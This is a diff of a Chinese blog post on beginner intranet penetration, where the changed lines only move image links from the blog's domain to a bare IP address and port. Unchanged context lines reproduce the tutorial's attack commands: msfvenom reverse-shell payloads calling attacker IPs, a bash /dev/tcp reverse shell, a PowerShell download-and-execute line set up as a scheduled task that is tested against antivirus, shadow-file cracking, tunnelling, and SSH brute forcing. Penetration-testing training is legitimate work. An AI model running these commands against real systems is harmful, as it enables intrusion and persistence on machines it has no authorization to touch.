@@ -13,31 +13,31 @@
 <meta property="og:site_name" content="Homaebic-Know thyself">
 <meta property="og:description" content="前言上个学期一直在学关于审计方面的知识，前几天ST2漏洞大火，随便打一个就是root权限，我却拿着root权限不知如何继续进行。因为这个，发现了自己对渗透知识的缺失，因此用了两周左右的时间学习补充了一下内网渗透的知识，看了不少大牛的文章，膜拜之余还是做了一些笔记的。到渗透入门结束之余，打算自己整理一下最近学习到的知识，写一篇文章。 渗透初探一个概念： 正向shell：攻击者连接被攻击者机器，可用于">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/789141832.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/3209463369.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/1654433721.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/3297350245.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/130628689.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/1396957995.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/1849068889.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/1675412074.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/2535078459.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/4169629812.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/3281981286.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/2122538903.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/2126598664.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/1073963976.jpg">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/328449163.png">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/2760296121.png">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/2866053101.png">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/92956616.png">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/2138848702.png">
-<meta property="og:image" content="http://hebic.me/usr/uploads/2017/03/711361399.png">
-<meta property="og:updated_time" content="2017-08-20T00:34:11.115Z">
+<meta property="og:image" content="http://120.25.80.195:7230/03/789141832.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/3209463369.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/1654433721.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/3297350245.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/130628689.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/1396957995.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/1849068889.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/1675412074.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2535078459.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/4169629812.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/3281981286.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2122538903.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2126598664.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/1073963976.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/328449163.png">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2760296121.png">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2866053101.png">
+<meta property="og:image" content="http://120.25.80.195:7230/03/92956616.png">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2138848702.png">
+<meta property="og:image" content="http://120.25.80.195:7230/03/711361399.png">
+<meta property="og:updated_time" content="2017-08-20T00:55:05.861Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0基础内网渗透思路整理与工具使用">
 <meta name="twitter:description" content="前言上个学期一直在学关于审计方面的知识，前几天ST2漏洞大火，随便打一个就是root权限，我却拿着root权限不知如何继续进行。因为这个，发现了自己对渗透知识的缺失，因此用了两周左右的时间学习补充了一下内网渗透的知识，看了不少大牛的文章，膜拜之余还是做了一些笔记的。到渗透入门结束之余，打算自己整理一下最近学习到的知识，写一篇文章。 渗透初探一个概念： 正向shell：攻击者连接被攻击者机器，可用于">
-<meta name="twitter:image" content="http://hebic.me/usr/uploads/2017/03/789141832.jpg">
+<meta name="twitter:image" content="http://120.25.80.195:7230/03/789141832.jpg">
     
     
         
@@ -161,9 +161,9 @@
 </code></pre></li>
 </ol>
 <h2 id="msf-shell"><a href="#msf-shell" class="headerlink" title="msf shell"></a>msf shell</h2><h4 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h4><h4 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h4><ol>
-<li>Linux:<code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444  -f elf -o isshell</code><br><img src="http://hebic.me/usr/uploads/2017/03/789141832.jpg" alt="linux_shell.jpg"></li>
-<li>Windows:<code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\\x00’ LHOST=121.196.209.139 LPORT=4444 -f exe &gt; abc.exe</code><br><img src="http://hebic.me/usr/uploads/2017/03/3209463369.jpg" alt="windows_shell.jpg"></li>
-<li>Android:<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=5555 R &gt; /root/apk.apk</code><br><img src="http://hebic.me/usr/uploads/2017/03/1654433721.jpg" alt="andioid_shell.jpg"></li>
+<li>Linux:<code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444  -f elf -o isshell</code><br><img src="http://120.25.80.195:7230/03/789141832.jpg" alt="linux_shell.jpg"></li>
+<li>Windows:<code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\\x00’ LHOST=121.196.209.139 LPORT=4444 -f exe &gt; abc.exe</code><br><img src="http://120.25.80.195:7230/03/3209463369.jpg" alt="windows_shell.jpg"></li>
+<li>Android:<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=5555 R &gt; /root/apk.apk</code><br><img src="http://120.25.80.195:7230/03/1654433721.jpg" alt="andioid_shell.jpg"></li>
 </ol>
 <h3 id="其他的各种各样的姿势的反弹shell："><a href="#其他的各种各样的姿势的反弹shell：" class="headerlink" title="其他的各种各样的姿势的反弹shell："></a>其他的各种各样的姿势的反弹shell：</h3><ol>
 <li>bash:<code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></li>
@@ -174,18 +174,18 @@
 <p>SSH端口转发：<br><code>Ssh -CfNg -L port1:127.0.0.1:port2 user@host</code> 本地转发<br><code>Ssh -CfNg -R port2:127.0.0.1:port1 user@hsst</code> 远程转发</p>
 <hr>
 <h2 id="拿到shell后的两个方向"><a href="#拿到shell后的两个方向" class="headerlink" title="拿到shell后的两个方向"></a>拿到shell后的两个方向</h2><h3 id="如果是低权限的机器，就提权："><a href="#如果是低权限的机器，就提权：" class="headerlink" title="如果是低权限的机器，就提权："></a>如果是低权限的机器，就提权：</h3><ol>
-<li>检查操作系统发行版本：<code>lsb_release -a</code><br><img src="http://hebic.me/usr/uploads/2017/03/3297350245.jpg" alt="lsb.jpg"></li>
-<li>查看内核版本：<code>uname -a</code><br><img src="http://hebic.me/usr/uploads/2017/03/130628689.jpg" alt="uname.jpg"> </li>
+<li>检查操作系统发行版本：<code>lsb_release -a</code><br><img src="http://120.25.80.195:7230/03/3297350245.jpg" alt="lsb.jpg"></li>
+<li>查看内核版本：<code>uname -a</code><br><img src="http://120.25.80.195:7230/03/130628689.jpg" alt="uname.jpg"> </li>
 </ol>
-<p>依据系统的内核，寻找对应的exp提权：<br>根据内核寻找exp的网站： <a><a href="https://www.kernel-exploits.com/" target="_blank" rel="external">https://www.kernel-exploits.com/</a></a> ，也可以用kali下的<code>searchsploit</code>命令<br><img src="http://hebic.me/usr/uploads/2017/03/1396957995.jpg" alt="search.jpg"><br>如果尝试的所有的exp都失败了，可以试一试新版本内核的exp。但是注意，内核exp提权有崩溃系统的风险。</p>
+<p>依据系统的内核，寻找对应的exp提权：<br>根据内核寻找exp的网站： <a><a href="https://www.kernel-exploits.com/" target="_blank" rel="external">https://www.kernel-exploits.com/</a></a> ，也可以用kali下的<code>searchsploit</code>命令<br><img src="http://120.25.80.195:7230/03/1396957995.jpg" alt="search.jpg"><br>如果尝试的所有的exp都失败了，可以试一试新版本内核的exp。但是注意，内核exp提权有崩溃系统的风险。</p>
 <h3 id="一些其他的办法："><a href="#一些其他的办法：" class="headerlink" title="一些其他的办法："></a>一些其他的办法：</h3><ol>
 <li>利用SUID提权<br>SUID是一种属性，他允许用户执行的文件以该文件的拥有者身份运行。3.81的nmap中可以使用交互模式以root执行任意系统命令。</li>
 <li>环境变量劫持的方法提权</li>
-<li>Passwd文件是否可写，可写则修改密码登录<br><img src="http://hebic.me/usr/uploads/2017/03/1849068889.jpg" alt="passwd.jpg"></li>
-<li>Shadow是否可读，可读则使用hashcat或john暴力破解<br><img src="http://hebic.me/usr/uploads/2017/03/1675412074.jpg" alt="shadow.jpg"></li>
+<li>Passwd文件是否可写，可写则修改密码登录<br><img src="http://120.25.80.195:7230/03/1849068889.jpg" alt="passwd.jpg"></li>
+<li>Shadow是否可读，可读则使用hashcat或john暴力破解<br><img src="http://120.25.80.195:7230/03/1675412074.jpg" alt="shadow.jpg"></li>
 <li>使用web端的一些密码测试root密码是否相同</li>
-<li>使用命令 <code>ls -l /etc/cron*</code> 查看计划任务，也许会有脚本使自己成为root用户<br><img src="http://hebic.me/usr/uploads/2017/03/2535078459.jpg" alt="cron.jpg"></li>
-<li>使用命令 <code>netstat -antup</code>查看服务，有没有什么神奇的服务，可以用nc转发出来。<br><img src="http://hebic.me/usr/uploads/2017/03/4169629812.jpg" alt="antup.jpg"></li>
+<li>使用命令 <code>ls -l /etc/cron*</code> 查看计划任务，也许会有脚本使自己成为root用户<br><img src="http://120.25.80.195:7230/03/2535078459.jpg" alt="cron.jpg"></li>
+<li>使用命令 <code>netstat -antup</code>查看服务，有没有什么神奇的服务，可以用nc转发出来。<br><img src="http://120.25.80.195:7230/03/4169629812.jpg" alt="antup.jpg"></li>
 <li>相关工具：<a><a href="https://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="external">https://www.securitysift.com/download/linuxprivchecker.py</a></a> 详细地列出网卡信息，主机信息，passwd文件，开启服务等等信息。</li>
 </ol>
 <p>提权的方法复杂而多样，主要的手段还是第一种的使用exp提权。在尝试所有的提权方法之后依然不能成功，那么可以使用这台主机作为跳板进行内网的进一步渗透。</p>
@@ -196,27 +196,27 @@
 </li>
 </ol>
 <h3 id="绕过拦截的计划任务："><a href="#绕过拦截的计划任务：" class="headerlink" title="绕过拦截的计划任务："></a>绕过拦截的计划任务：</h3><ol>
-<li>构造创建计划任务：<code>schtasks /create /tn mytask /tr notepad.exe /sc hourly  /mo 1 #每小时执行一次</code><br><img src="http://hebic.me/usr/uploads/2017/03/3281981286.jpg" alt="计划任务.jpg"></li>
-<li><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://a.com/1.ps1&#39;);&quot;</code> 保存以上命令到1.ps一，通过IEX下载执行。<br><img src="http://hebic.me/usr/uploads/2017/03/2122538903.jpg" alt="计划报毒.jpg"> </li>
+<li>构造创建计划任务：<code>schtasks /create /tn mytask /tr notepad.exe /sc hourly  /mo 1 #每小时执行一次</code><br><img src="http://120.25.80.195:7230/03/3281981286.jpg" alt="计划任务.jpg"></li>
+<li><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://a.com/1.ps1&#39;);&quot;</code> 保存以上命令到1.ps一，通过IEX下载执行。<br><img src="http://120.25.80.195:7230/03/2122538903.jpg" alt="计划报毒.jpg"> </li>
 </ol>
-<p><img src="http://hebic.me/usr/uploads/2017/03/2126598664.jpg" alt="powershell 计划之情.jpg"></p>
+<p><img src="http://120.25.80.195:7230/03/2126598664.jpg" alt="powershell 计划之情.jpg"></p>
 <ol>
 <li>本机测试时360第二种报毒，第一种通过。</li>
 </ol>
 <hr>
 <h1 id="网络分析"><a href="#网络分析" class="headerlink" title="网络分析"></a>网络分析</h1><h2 id="查看本机网络信息"><a href="#查看本机网络信息" class="headerlink" title="查看本机网络信息"></a>查看本机网络信息</h2><p><code>ipconfig</code></p>
 <h2 id="使用代理探测内网"><a href="#使用代理探测内网" class="headerlink" title="使用代理探测内网"></a>使用代理探测内网</h2><h3 id="正向代理：Regeorg-proxychains-（win下用proxycap）"><a href="#正向代理：Regeorg-proxychains-（win下用proxycap）" class="headerlink" title="正向代理：Regeorg + proxychains （win下用proxycap）"></a>正向代理：Regeorg + proxychains （win下用proxycap）</h3><ol>
-<li>Regeorg: <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">https://github.com/sensepost/reGeorg</a><br><img src="http://hebic.me/usr/uploads/2017/03/1073963976.jpg" alt="regeorg.jpg"><br>上传服务器可执行的tunnel文件，在本机执行：<code>python reGeorgSocksProxy.py -p 2333 -u http://aaaaaa.com/tunnel.php</code></li>
-<li>Proxychains: <a><a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="external">https://github.com/rofl0r/proxychains-ng</a></a><br><img src="http://hebic.me/usr/uploads/2017/03/328449163.png" alt="proxychains.png"><br>配置文件 <code>vim /etc/proxychains.conf</code><br>在最后一行添加<code>socks5 127.0.0.1 2333</code>(与regeorg端口相同)<br>使用时，在执行的命令前加proxhchains 4, 比如：<code>proxychains4 nmap -sT -Pn -n 127.0.0.1</code><h3 id="反向代理：路由表-socks4a-proxychains"><a href="#反向代理：路由表-socks4a-proxychains" class="headerlink" title="反向代理：路由表+socks4a+proxychains"></a>反向代理：路由表+socks4a+proxychains</h3>在msf中如果拿到一个meterpreter shell，有一个很简单的添加路由表的方法：<code>run autoroute -s 192.168.122.0/24</code>，添加完路由表后，msf框架就可以使用跳板进行对192.168.122.0/24的网络访问了。<br>若要使用nmap一类的工具，需要使用msf框架中的socks4a工具代理，目录：<code>auxiliary/server/socks4a</code><br><img src="http://hebic.me/usr/uploads/2017/03/2760296121.png" alt="socks4a.png"></li>
+<li>Regeorg: <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">https://github.com/sensepost/reGeorg</a><br><img src="http://120.25.80.195:7230/03/1073963976.jpg" alt="regeorg.jpg"><br>上传服务器可执行的tunnel文件，在本机执行：<code>python reGeorgSocksProxy.py -p 2333 -u http://aaaaaa.com/tunnel.php</code></li>
+<li>Proxychains: <a><a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="external">https://github.com/rofl0r/proxychains-ng</a></a><br><img src="http://120.25.80.195:7230/03/328449163.png" alt="proxychains.png"><br>配置文件 <code>vim /etc/proxychains.conf</code><br>在最后一行添加<code>socks5 127.0.0.1 2333</code>(与regeorg端口相同)<br>使用时，在执行的命令前加proxhchains 4, 比如：<code>proxychains4 nmap -sT -Pn -n 127.0.0.1</code><h3 id="反向代理：路由表-socks4a-proxychains"><a href="#反向代理：路由表-socks4a-proxychains" class="headerlink" title="反向代理：路由表+socks4a+proxychains"></a>反向代理：路由表+socks4a+proxychains</h3>在msf中如果拿到一个meterpreter shell，有一个很简单的添加路由表的方法：<code>run autoroute -s 192.168.122.0/24</code>，添加完路由表后，msf框架就可以使用跳板进行对192.168.122.0/24的网络访问了。<br>若要使用nmap一类的工具，需要使用msf框架中的socks4a工具代理，目录：<code>auxiliary/server/socks4a</code><br><img src="http://120.25.80.195:7230/03/2760296121.png" alt="socks4a.png"></li>
 </ol>
-<p>开启socks4a后可以用<code>netstat -antp | grep 1080</code>来检查一下是否成功。<br><img src="http://hebic.me/usr/uploads/2017/03/2866053101.png" alt="nmap.png"></p>
+<p>开启socks4a后可以用<code>netstat -antp | grep 1080</code>来检查一下是否成功。<br><img src="http://120.25.80.195:7230/03/2866053101.png" alt="nmap.png"></p>
 <h4 id="Proxychains-不支持ICMP协议，nmap要加-sT-和-Pn-参数。"><a href="#Proxychains-不支持ICMP协议，nmap要加-sT-和-Pn-参数。" class="headerlink" title="Proxychains 不支持ICMP协议，nmap要加-sT 和 -Pn 参数。"></a>Proxychains 不支持ICMP协议，nmap要加-sT 和 -Pn 参数。</h4><h3 id="使用nmap探测内网服务"><a href="#使用nmap探测内网服务" class="headerlink" title="使用nmap探测内网服务"></a>使用nmap探测内网服务</h3><ol>
 <li>如果只探测服务，则查看hosts，扫描特定的服务。</li>
 <li>如果为了探测整个内网，则全网段扫描。</li>
 </ol>
-<h3 id="通过跳板对内网爆破"><a href="#通过跳板对内网爆破" class="headerlink" title="通过跳板对内网爆破"></a>通过跳板对内网爆破</h3><p>kali工具包中的Hydra可以爆破SSH。<br><img src="http://hebic.me/usr/uploads/2017/03/92956616.png" alt="SSHbaopo.png"></p>
-<h3 id="通过跳板转发端口"><a href="#通过跳板转发端口" class="headerlink" title="通过跳板转发端口"></a>通过跳板转发端口</h3><p>使用msf的portfwd工具可以转发内网ip的端口。<br><img src="http://hebic.me/usr/uploads/2017/03/2138848702.png" alt="portfwd.png"></p>
-<p><img src="http://hebic.me/usr/uploads/2017/03/711361399.png" alt="portfwd2.png"></p>
+<h3 id="通过跳板对内网爆破"><a href="#通过跳板对内网爆破" class="headerlink" title="通过跳板对内网爆破"></a>通过跳板对内网爆破</h3><p>kali工具包中的Hydra可以爆破SSH。<br><img src="http://120.25.80.195:7230/03/92956616.png" alt="SSHbaopo.png"></p>
+<h3 id="通过跳板转发端口"><a href="#通过跳板转发端口" class="headerlink" title="通过跳板转发端口"></a>通过跳板转发端口</h3><p>使用msf的portfwd工具可以转发内网ip的端口。<br><img src="http://120.25.80.195:7230/03/2138848702.png" alt="portfwd.png"></p>
+<p><img src="http://120.25.80.195:7230/03/711361399.png" alt="portfwd2.png"></p>
 <h4 id="关注的两个点："><a href="#关注的两个点：" class="headerlink" title="关注的两个点："></a>关注的两个点：</h4><ol>
 <li>寻找交换机路由器，尝试snmp弱口令。关于snmp的知识：<a><a href="http://wooyun.jozxing.cc/static/drops/tips-409.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-409.html</a></a></li>
 <li>通过收集到的信息，编写字典，对ftp,ssh,dbserver进行爆破。</li>
